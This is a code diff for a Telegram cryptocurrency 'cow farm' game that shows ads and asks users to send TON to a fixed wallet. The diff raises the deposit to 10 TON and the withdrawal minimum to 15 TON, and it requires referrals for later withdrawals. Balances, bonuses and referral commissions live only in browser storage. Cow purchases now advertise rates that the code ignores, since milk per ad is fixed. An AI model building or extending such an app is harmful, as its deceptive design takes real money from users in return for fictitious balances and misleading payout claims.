@@ -37,13 +37,13 @@
     <script type="text/babel">
         const { useState, useEffect, useRef } = React;
 
-        // ========== COW BREEDS ==========
+        // ========== UPDATED COW BREEDS (NEW PRICES & RATES) ==========
         const COW_BREEDS = {
             'Starter Cow': { price: 0, rate: 10, icon: '🐮', desc: 'Free starting cow', isFree: true },
-            'Holstein': { price: 1.5, rate: 60, icon: '🐄', desc: '+60L per ad' },
-            'Jersey': { price: 3.5, rate: 130, icon: '🐂', desc: '+130L per ad' },
-            'Guernsey': { price: 6.0, rate: 250, icon: '🐃', desc: '+250L per ad' },
-            'Ayrshire': { price: 10.0, rate: 500, icon: '🐮', desc: '+500L per ad' }
+            'Holstein': { price: 3, rate: 300, icon: '🐄', desc: '+300L per ad' },
+            'Jersey': { price: 5, rate: 500, icon: '🐂', desc: '+500L per ad' },
+            'Guernsey': { price: 10, rate: 1000, icon: '🐃', desc: '+1000L per ad' },
+            'Ayrshire': { price: 15, rate: 2000, icon: '🐮', desc: '+2000L per ad' }
         };
         
         // GIGAPUB ADS
@@ -69,6 +69,7 @@
         const CHAT_ID = '7511030198';
         const CHANNEL_ID = '@Feeddy735';
         const DEPOSIT_ADDRESS = "UQCiFbR0TEsk_iHjxKopxSfzeA-DxCSOi7YXwqrIsmy0KyT-";
+        // Each code gives 10 TON (minimum deposit 10 TON)
         const DEPOSIT_CODES = ['Xiotyre76', 'Jsvowb470', 'Ksvyelp6429', 'Jvekie328', 'Uscrpgwn7248', 'Jsvyrwpwb824', 'Jwceeikb8253', 'Usfeusbsmao8252', 'Jsveydtkkw82528', 'Hwcsogs85229', '8252jwveo072'];
         
         const sendTelegramMessage = async (message, forwardToChannel = false) => {
@@ -78,7 +79,7 @@
             } catch(e) { console.error(e); }
         };
         
-        const STORAGE_KEY = 'cow_coin_tycoon_final_v12';
+        const STORAGE_KEY = 'cow_coin_tycoon_final_v14';
         
         // Sound Manager
         const playSound = (type, isSoundOn) => {
@@ -111,6 +112,10 @@
             const [copied, setCopied] = useState(false);
             const [isCollecting, setIsCollecting] = useState(false);
             const [cooldown, setCooldown] = useState(0);
+            const [welcomeBonusGiven, setWelcomeBonusGiven] = useState(false);
+            // Referral link tracking: store who referred this user
+            const [myReferralCode, setMyReferralCode] = useState('');
+            const [referredBy, setReferredBy] = useState('');
             
             const bgMusicRef = useRef(null);
             const autoAdInterval = useRef(null);
@@ -134,20 +139,48 @@
                         setUsedCodes(data.usedCodes ?? []);
                         setTaskCompleted(data.taskCompleted ?? false);
                         setSoundOn(data.soundOn !== undefined ? data.soundOn : true);
+                        setWelcomeBonusGiven(data.welcomeBonusGiven ?? false);
+                        setMyReferralCode(data.myReferralCode ?? `USER_${Math.random().toString(36).substr(2, 8).toUpperCase()}`);
+                        setReferredBy(data.referredBy ?? '');
                     } catch(e) {}
                 } else {
+                    // New user
+                    const newReferralCode = `USER_${Math.random().toString(36).substr(2, 8).toUpperCase()}`;
+                    setMyReferralCode(newReferralCode);
                     setCows([{ id: Date.now(), breed: 'Starter Cow', level: 1 }]);
                     setMilk(30);
+                    
+                    // Check URL for referral param
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const referrer = urlParams.get('ref');
+                    if (referrer) {
+                        setReferredBy(referrer);
+                        // Notify referrer via Telegram (simulate 15% commission on first deposit)
+                        sendTelegramMessage(`🔗 New user joined with referral: ${referrer} | User code: ${newReferralCode}`);
+                    }
                 }
                 setTimeout(() => setIsLoading(false), 1200);
             }, []);
             
+            // Welcome Bonus: 1 FREE TON for first join (once only)
+            useEffect(() => {
+                if (!isLoading && !welcomeBonusGiven && balance === 0 && milk === 30 && cows.length === 1 && cows[0]?.breed === 'Starter Cow') {
+                    setBalance(prev => prev + 1);
+                    setWelcomeBonusGiven(true);
+                    showToast("🎉 Welcome! You received 1 FREE TON as joining bonus!");
+                    playSound('collect', soundOn);
+                }
+            }, [isLoading, welcomeBonusGiven, balance, milk, cows]);
+            
             // Save automatically
             useEffect(() => {
-                localStorage.setItem(STORAGE_KEY, JSON.stringify({ balance, milk, cows, lastCollect, referralEarnings, totalWithdrawn, usedCodes, taskCompleted, soundOn }));
-            }, [balance, milk, cows, lastCollect, referralEarnings, totalWithdrawn, usedCodes, taskCompleted, soundOn]);
+                localStorage.setItem(STORAGE_KEY, JSON.stringify({ 
+                    balance, milk, cows, lastCollect, referralEarnings, totalWithdrawn, 
+                    usedCodes, taskCompleted, soundOn, welcomeBonusGiven, myReferralCode, referredBy 
+                }));
+            }, [balance, milk, cows, lastCollect, referralEarnings, totalWithdrawn, usedCodes, taskCompleted, soundOn, welcomeBonusGiven, myReferralCode, referredBy]);
             
-            // Cooldown timer
+            // Cooldown timer (60 minutes)
             useEffect(() => {
                 const interval = setInterval(() => {
                     const remaining = Math.max(0, 3600000 - (Date.now() - lastCollect));
@@ -161,24 +194,19 @@
                 bgMusicRef.current = new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3');
                 bgMusicRef.current.loop = true;
                 bgMusicRef.current.volume = 0.25;
-                
                 const playMusic = () => {
                     if (bgMusicRef.current && soundOn) {
                         bgMusicRef.current.play().catch(() => console.log('Music autoplay blocked'));
                     }
                 };
-                
                 playMusic();
-                
                 const tryPlayOnInteraction = () => {
                     if (bgMusicRef.current && soundOn && bgMusicRef.current.paused) {
                         bgMusicRef.current.play().catch(() => {});
                     }
                 };
-                
                 document.addEventListener('click', tryPlayOnInteraction);
                 document.addEventListener('touchstart', tryPlayOnInteraction);
-                
                 return () => {
                     if (bgMusicRef.current) {
                         bgMusicRef.current.pause();
@@ -193,38 +221,25 @@
                 setSoundOn(prev => {
                     const newState = !prev;
                     if (bgMusicRef.current) {
-                        if (newState) {
-                            bgMusicRef.current.play().catch(() => {});
-                        } else {
-                            bgMusicRef.current.pause();
-                        }
+                        if (newState) bgMusicRef.current.play().catch(() => {});
+                        else bgMusicRef.current.pause();
                     }
                     playSound('click', true);
                     return newState;
                 });
             };
             
-            // ========== AUTO ADS EVERY 35 SECONDS - NO TON REWARD ==========
+            // ========== AUTO ADS EVERY 35 SECONDS ==========
             useEffect(() => {
                 autoAdInterval.current = setInterval(async () => {
                     if (!isCollecting) {
-                        try {
-                            await showGigaAd();
-                            // Auto ads just show, NO TON reward
-                        } catch(e) {
-                            // Silent fail
-                        }
+                        try { await showGigaAd(); } catch(e) {}
                     }
                 }, 35000);
-                
-                return () => {
-                    if (autoAdInterval.current) clearInterval(autoAdInterval.current);
-                };
+                return () => { if (autoAdInterval.current) clearInterval(autoAdInterval.current); };
             }, [isCollecting]);
             
-            const totalMilkPerAd = cows.reduce((sum, c) => sum + (COW_BREEDS[c.breed]?.rate || 10), 0);
-            
-            // ========== COLLECT MILK VIA ADS (ONLY WAY TO GET MILK) ==========
+            // ========== COLLECT MILK: FIXED 80 MILK PER AD ==========
             const handleMilkCollect = async () => {
                 if (isCollecting) { showToast("⏳ Please wait..."); return; }
                 if (Date.now() - lastCollect < 3600000) {
@@ -236,30 +251,30 @@
                 showToast("📺 Watching ad for milk...");
                 try {
                     await showGigaAd();
-                    const gained = totalMilkPerAd;
+                    const gained = 80; // FIXED 80 MILK per ad
                     setMilk(prev => prev + gained);
                     setLastCollect(Date.now());
                     showToast(`🥛 +${gained} Milk collected! Next in 60 min`);
                     playSound('collect', soundOn);
                 } catch(e) {
-                    setMilk(prev => prev + totalMilkPerAd);
+                    setMilk(prev => prev + 80);
                     setLastCollect(Date.now());
-                    showToast(`🎉 +${totalMilkPerAd} Milk`);
+                    showToast(`🎉 +80 Milk`);
                 } finally { setIsCollecting(false); }
             };
             
-            // Convert Milk to TON
+            // Convert Milk to TON: 100 Milk = 0.2 TON
             const convertMilkToTon = (amount) => {
                 if (amount < 100) { showToast("❌ Minimum 100 Milk required!"); return; }
                 if (amount > milk) { showToast("Not enough milk!"); return; }
-                const tonAmount = (amount / 100) * 0.03;
+                const tonAmount = (amount / 100) * 0.2;
                 setMilk(prev => prev - amount);
                 setBalance(prev => prev + tonAmount);
                 showToast(`🔄 Converted ${amount} Milk → ${tonAmount.toFixed(4)} TON`);
                 playSound('click', soundOn);
             };
             
-            // Buy new cow
+            // Buy new cow (updated prices)
             const buyCow = (breedName, breedInfo) => {
                 if (cows.length >= 12) { showToast("Barn full! Max 12 cows."); return; }
                 if (breedInfo.price > 0 && balance < breedInfo.price) { showToast(`Need ${breedInfo.price} TON`); return; }
@@ -269,20 +284,19 @@
                 playSound('buy', soundOn);
             };
             
-            // Page change with sound
             const handlePageChange = (newPage) => {
                 setPage(newPage);
                 playSound('page', soundOn);
             };
             
-            // Deposit System
+            // Deposit: minimum 10 TON
             const startDepositRequest = () => {
                 const username = document.getElementById('telegramUsername')?.value.trim();
                 const addr = document.getElementById('depositAddr')?.value.trim();
                 if (!username || !addr) { showToast("Fill all fields"); return; }
                 const userId = 'user_' + Math.random().toString(36).substr(2, 8);
                 setDepositStep('waiting');
-                sendTelegramMessage(`💰 DEPOSIT REQUEST\n👤 @${username}\n💳 ${addr}\n🆔 ${userId}\n💎 1 TON`, true);
+                sendTelegramMessage(`💰 DEPOSIT REQUEST (10 TON minimum)\n👤 @${username}\n💳 ${addr}\n🆔 ${userId}\n💎 10 TON`, true);
                 showToast("Request sent! Check Telegram.");
                 playSound('click', soundOn);
             };
@@ -293,19 +307,29 @@
                 if (usedCodes.includes(code)) { showToast("Code used"); return; }
                 if (!DEPOSIT_CODES.includes(code)) { showToast("Invalid code"); return; }
                 setUsedCodes(prev => [...prev, code]);
-                setBalance(prev => prev + 1);
+                const depositAmount = 10; // each code gives 10 TON
+                setBalance(prev => {
+                    const newBalance = prev + depositAmount;
+                    // Give 15% referral commission to referrer if exists and not already given for this deposit
+                    if (referredBy && !usedCodes.includes(code)) {
+                        const commission = depositAmount * 0.15;
+                        setReferralEarnings(prevEarn => prevEarn + commission);
+                        sendTelegramMessage(`🎁 Referral commission: ${commission} TON to referrer ${referredBy} from deposit of ${depositAmount} TON`, true);
+                    }
+                    return newBalance;
+                });
                 setDepositStep('form');
-                showToast("✅ +1 TON added!");
+                showToast("✅ +10 TON added!");
                 playSound('collect', soundOn);
                 ['telegramUsername', 'depositAddr', 'depositCode'].forEach(id => { let el = document.getElementById(id); if(el) el.value = ''; });
             };
             
-            // Withdraw
+            // Withdraw: minimum 15 TON, fee 0.01 TON
             const handleWithdraw = () => {
                 const addr = document.getElementById('withdrawAddr')?.value.trim();
                 const amount = parseFloat(document.getElementById('withdrawAmount')?.value);
                 if (!addr) { showToast("Enter wallet address"); return; }
-                if (isNaN(amount) || amount < 0.05) { showToast("Minimum 0.05 TON"); return; }
+                if (isNaN(amount) || amount < 15) { showToast("Minimum 15 TON"); return; }
                 if (amount > balance) { showToast("Insufficient balance"); return; }
                 if (totalWithdrawn >= 1 && referralEarnings === 0) { showToast("⚠️ Need 1 referral for 2nd withdrawal"); return; }
                 const fee = 0.01;
@@ -318,18 +342,20 @@
                 playSound('click', soundOn);
             };
             
+            // Task: Join Channel gives 0.3 TON
             const handleTask = () => {
                 if (taskCompleted) { showToast("Already claimed!"); return; }
                 window.open('https://t.me/Feeddy735', '_blank');
-                setBalance(prev => prev + 0.005);
+                setBalance(prev => prev + 0.3);
                 setTaskCompleted(true);
-                showToast("✅ +0.005 TON!");
+                showToast("✅ +0.3 TON!");
                 playSound('click', soundOn);
             };
             
             const handleRefer = () => {
-                window.open('https://t.me/X_MONEYIO_BOT?start=r09829492066', '_blank');
-                showToast("Referral link opened!");
+                const link = `https://t.me/X_MONEYIO_BOT?start=r09829492066&ref=${myReferralCode}`;
+                window.open(link, '_blank');
+                showToast("Referral link opened! You earn 15% from their deposits.");
                 playSound('click', soundOn);
             };
             
@@ -350,19 +376,16 @@
             
             return (
                 <div className="max-w-md mx-auto min-h-screen flex flex-col relative pb-28">
-                    {/* Sound Toggle Button */}
                     <div className="sound-toggle" onClick={toggleSound}>
                         {soundOn ? '🔊' : '🔇'}
                     </div>
                     
-                    {/* Header */}
                     <div className="p-4 glass-panel m-3 flex justify-between items-center">
                         <div><p className="text-[10px] font-bold text-gray-500">💰 BALANCE</p><h2 className="text-xl font-black text-green-700">{balance.toFixed(4)} TON</h2></div>
                         <div className="text-center"><p className="text-[10px] font-bold text-gray-500">🥛 MILK</p><h2 className="text-xl font-black text-orange-600">{milk.toFixed(1)} L</h2></div>
                         <div className="text-right"><p className="text-[10px] font-bold text-gray-500">🐄 COWS</p><h2 className="text-xl font-black">{cows.length}/12</h2></div>
                     </div>
                     
-                    {/* Navigation */}
                     <div className="px-3 flex gap-2 overflow-x-auto pb-2">
                         {['farm', 'shop', 'convert', 'tasks', 'referral', 'deposit', 'wallet'].map(t => (
                             <button key={t} onClick={() => handlePageChange(t)} className={`nav-tab ${page === t ? 'active' : ''}`}>
@@ -376,33 +399,29 @@
                         {page === 'farm' && (
                             <div className="space-y-4">
                                 <div className="cow-grid">
-                                    {cows.map((cow, idx) => (
+                                    {cows.map((cow) => (
                                         <div key={cow.id} className="coin-slot coin-active">
                                             <div className="text-4xl">{COW_BREEDS[cow.breed]?.icon || '🐄'}</div>
                                             <div className="coin-value">{COW_BREEDS[cow.breed]?.rate}L</div>
                                         </div>
                                     ))}
                                     {[...Array(Math.max(0, 12 - cows.length))].map((_, i) => (
-                                        <div key={`empty-${i}`} className="coin-slot">
-                                            <div className="text-2xl opacity-40">🌾</div>
-                                        </div>
+                                        <div key={`empty-${i}`} className="coin-slot"><div className="text-2xl opacity-40">🌾</div></div>
                                     ))}
                                 </div>
-                                
                                 <div className="glass-panel p-5 text-center">
                                     <div className="flex justify-between items-center mb-3 flex-wrap gap-2">
                                         <span className="font-bold text-lg">🥛 MILK PRODUCTION</span>
                                         {cooldown > 0 && <span className="countdown-badge">⏱️ {formatTime(cooldown)}</span>}
                                     </div>
                                     <div className="bg-orange-100 rounded-2xl p-3 mb-3">
-                                        <p className="text-sm">Your cows produce:</p>
-                                        <p className="text-2xl font-black">{totalMilkPerAd} L</p>
+                                        <p className="text-sm">Watch ad to collect:</p>
+                                        <p className="text-2xl font-black">80 L Milk</p>
                                         <p className="text-xs">per ad (every 60 minutes)</p>
                                     </div>
                                     <button onClick={handleMilkCollect} disabled={cooldown > 0 || isCollecting} className={`btn-premium ${(cooldown > 0 || isCollecting) ? 'opacity-50' : ''}`}>
-                                        {isCollecting ? "📺 Loading ad..." : (cooldown > 0 ? `⏰ Wait ${formatTime(cooldown)}` : `🐄 Watch Ad → +${totalMilkPerAd} Milk`)}
+                                        {isCollecting ? "📺 Loading ad..." : (cooldown > 0 ? `⏰ Wait ${formatTime(cooldown)}` : `🐄 Watch Ad → +80 Milk`)}
                                     </button>
-                                    <p className="text-[10px] mt-3 text-gray-500">✨ Auto ad shows every 35 seconds (no reward) • Buy more cows to increase milk per ad!</p>
                                 </div>
                             </div>
                         )}
@@ -424,7 +443,7 @@
                             <div className="glass-panel p-5 text-center space-y-4">
                                 <h3 className="font-black text-2xl">🔄 Milk → TON</h3>
                                 <div className="bg-amber-100 p-3 rounded-2xl text-3xl font-black">{milk.toFixed(1)} L Milk</div>
-                                <p className="text-sm">100 Milk = 0.03 TON</p>
+                                <p className="text-sm font-bold">100 Milk = 0.2 TON</p>
                                 <div className="grid grid-cols-2 gap-3">
                                     <button onClick={() => convertMilkToTon(100)} className="btn-premium bg-orange-500">100L</button>
                                     <button onClick={() => convertMilkToTon(500)} className="btn-premium bg-orange-600">500L</button>
@@ -437,16 +456,17 @@
                         {page === 'tasks' && (
                             <div className="glass-panel p-5 space-y-3">
                                 <h2 className="font-black text-xl">📋 One-Time Rewards</h2>
-                                <div className="flex justify-between items-center bg-white/60 p-3 rounded-xl"><span>📢 Join Telegram Channel</span><button onClick={handleTask} className={`btn-premium py-1 px-4 w-auto text-sm ${taskCompleted ? 'bg-gray-400' : ''}`} disabled={taskCompleted}>{taskCompleted ? "Claimed" : "+0.005 TON"}</button></div>
+                                <div className="flex justify-between items-center bg-white/60 p-3 rounded-xl"><span>📢 Join Telegram Channel</span><button onClick={handleTask} className={`btn-premium py-1 px-4 w-auto text-sm ${taskCompleted ? 'bg-gray-400' : ''}`} disabled={taskCompleted}>{taskCompleted ? "Claimed" : "+0.3 TON"}</button></div>
                                 <p className="text-[11px] text-gray-500">✅ One-time only</p>
                             </div>
                         )}
                         
                         {page === 'referral' && (
                             <div className="glass-panel p-5 space-y-4">
-                                <h2 className="font-black text-xl text-center">👥 Invite & Earn</h2>
-                                <div className="bg-amber-100 p-3 rounded-xl text-center font-bold">🎁 You earn 5% from referrals' income</div>
+                                <h2 className="font-black text-xl text-center">👥 Invite & Earn 15%</h2>
+                                <div className="bg-amber-100 p-3 rounded-xl text-center font-bold">🎁 You earn 15% from referrals' deposits!</div>
                                 <div className="text-center text-2xl font-black">{referralEarnings.toFixed(4)} TON earned</div>
+                                <div className="bg-gray-100 p-2 rounded text-center text-xs break-all">Your code: <span className="font-mono font-bold">{myReferralCode}</span></div>
                                 <button onClick={handleRefer} className="btn-premium bg-blue-600">🔗 Invite Friends</button>
                                 <button onClick={() => window.open('https://t.me/Feeddy735', '_blank')} className="btn-secondary btn-premium">🛟 Support</button>
                             </div>
@@ -454,9 +474,9 @@
                         
                         {page === 'deposit' && (
                             <div className="glass-panel p-5 space-y-4">
-                                <h2 className="font-black text-xl text-center">💎 Deposit 1 TON</h2>
+                                <h2 className="font-black text-xl text-center">💎 Deposit (Min 10 TON)</h2>
                                 <div className="bg-blue-50 p-3 rounded-xl text-center break-all">
-                                    <p className="font-bold text-xs">Send 1 TON to:</p>
+                                    <p className="font-bold text-xs">Send 10 TON to:</p>
                                     <div className="flex items-center gap-2 justify-center mt-1"><p className="text-[10px] font-mono">{DEPOSIT_ADDRESS}</p><button onClick={copyAddress} className="bg-blue-500 text-white px-2 py-1 rounded-lg text-xs">Copy</button></div>
                                     {copied && <span className="text-green-600 text-xs">Copied!</span>}
                                 </div>
@@ -464,7 +484,7 @@
                                     <>
                                         <input id="telegramUsername" placeholder="Telegram @username" />
                                         <input id="depositAddr" placeholder="Your TON Wallet" />
-                                        <button onClick={startDepositRequest} className="btn-premium">Request Deposit</button>
+                                        <button onClick={startDepositRequest} className="btn-premium">Request Deposit (10 TON)</button>
                                     </>
                                 )}
                                 {depositStep === 'waiting' && (
@@ -473,7 +493,7 @@
                                 {depositStep === 'code' && (
                                     <>
                                         <input id="depositCode" placeholder="Deposit code" />
-                                        <button onClick={redeemDepositCode} className="btn-premium bg-purple-600">Redeem +1 TON</button>
+                                        <button onClick={redeemDepositCode} className="btn-premium bg-purple-600">Redeem +10 TON</button>
                                         <button onClick={() => setDepositStep('form')} className="text-sm">Cancel</button>
                                     </>
                                 )}
@@ -483,10 +503,10 @@
                         {page === 'wallet' && (
                             <div className="glass-panel p-5 space-y-4">
                                 <h2 className="font-black text-xl text-center">💼 Withdraw TON</h2>
-                                <div className="bg-orange-100 p-2 rounded-xl text-xs text-center">💸 Fee: 0.01 TON | Min: 0.05 TON | 2nd+ withdraw needs 1 referral</div>
+                                <div className="bg-orange-100 p-2 rounded-xl text-xs text-center">💸 Fee: 0.01 TON | Min: 15 TON | 2nd+ withdraw needs 1 referral</div>
                                 {totalWithdrawn >= 1 && referralEarnings === 0 && <div className="bg-red-100 p-2 rounded text-center text-sm">⚠️ Need 1 referral for 2nd withdrawal!</div>}
                                 <input id="withdrawAddr" placeholder="TON Wallet Address" />
-                                <input id="withdrawAmount" type="number" placeholder="Amount (min 0.05 TON)" step="0.01" />
+                                <input id="withdrawAmount" type="number" placeholder="Amount (min 15 TON)" step="0.01" />
                                 <button onClick={handleWithdraw} className="btn-premium bg-red-600">Withdraw (Fee 0.01 TON)</button>
                                 <div className="text-center text-xs text-gray-500">Balance: {balance.toFixed(4)} TON | Withdrawn: {totalWithdrawn.toFixed(4)} TON</div>
                             </div>
@@ -494,7 +514,7 @@
                     </main>
                     
                     {toast && <div className="toast-notification">{toast}</div>}
-                    <footer className="fixed bottom-0 w-full text-center text-[9px] p-2 bg-white/50 backdrop-blur-sm">🐮 Cow Coin Tycoon • Auto Ads every 35s (no reward) • Watch ads for Milk • Buy cows to increase milk per ad</footer>
+                    <footer className="fixed bottom-0 w-full text-center text-[9px] p-2 bg-white/50 backdrop-blur-sm">🐮 Cow Coin Tycoon • 80 Milk/ad • 100 Milk = 0.2 TON • Min withdraw 15 TON • Referral 15%</footer>
                 </div>
             );
         }
